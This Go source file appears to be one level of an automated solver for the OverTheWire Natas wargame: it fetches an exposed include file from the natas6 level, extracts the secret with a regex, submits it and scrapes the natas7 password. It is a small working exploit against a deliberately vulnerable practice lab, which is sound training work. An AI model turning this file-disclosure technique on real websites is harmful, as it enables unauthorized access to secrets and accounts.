package levels

import (
	"io"
	"log"
	"net/http"
	"net/url"
	"regexp"
	"strings"
)

type Post struct {
	Secret string `json:"secret"`
}

func getSecretFromLevel6(client *http.Client, username string, password string) string {
	req, err := http.NewRequest("GET", "http://natas6.natas.labs.overthewire.org/includes/secret.inc", nil)
	if err != nil {
		log.Fatal(err)
	}

	req.SetBasicAuth(username, password)

	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}

	bodyText, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}

	s := string(bodyText)
	re := regexp.MustCompile(`"(.*)"`)
	match := re.FindStringSubmatch(s)
	secret := match[1]

	return secret
}

func GetLevel7Password(password string) string {
	var username string = "natas6"
	client := &http.Client{}

	var secret string = getSecretFromLevel6(client, username, password)

	form := url.Values{}
	form.Add("secret", secret)
	form.Add("submit", "1")
	requestBody := strings.NewReader(form.Encode())

	req, err := http.NewRequest(http.MethodPost, "http://natas6.natas.labs.overthewire.org", requestBody)
	if err != nil {
		log.Fatal(err)
	}

	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.SetBasicAuth(username, password)

	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}

	bodyText, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}

	s := string(bodyText)
	re := regexp.MustCompile(`The password for natas7 is (.*)`)
	match := re.FindStringSubmatch(s)
	natas7Passowrd := match[1]

	return natas7Passowrd
}
